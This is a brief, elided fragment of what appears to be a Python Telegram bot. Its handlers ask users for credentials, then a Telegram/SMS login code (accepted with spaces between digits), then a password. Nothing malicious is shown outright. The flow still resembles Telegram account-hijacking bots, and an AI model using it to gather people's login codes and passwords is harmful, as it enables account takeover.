...
async def receive_credentials(message: types.Message):
    ...
    await message.reply("Code sent to your Telegram/SMS. Reply with `/code <12345>` (or with spaces like `/code 1 2 3 4 5`).")
...
async def receive_code(message: types.Message):
    ...
    # Accept codes with or without spaces
...
async def receive_password(message: types.Message):
    ...
    # Strip extra spaces in password (just in case)
    password = " ".join(parts[1].strip().split())
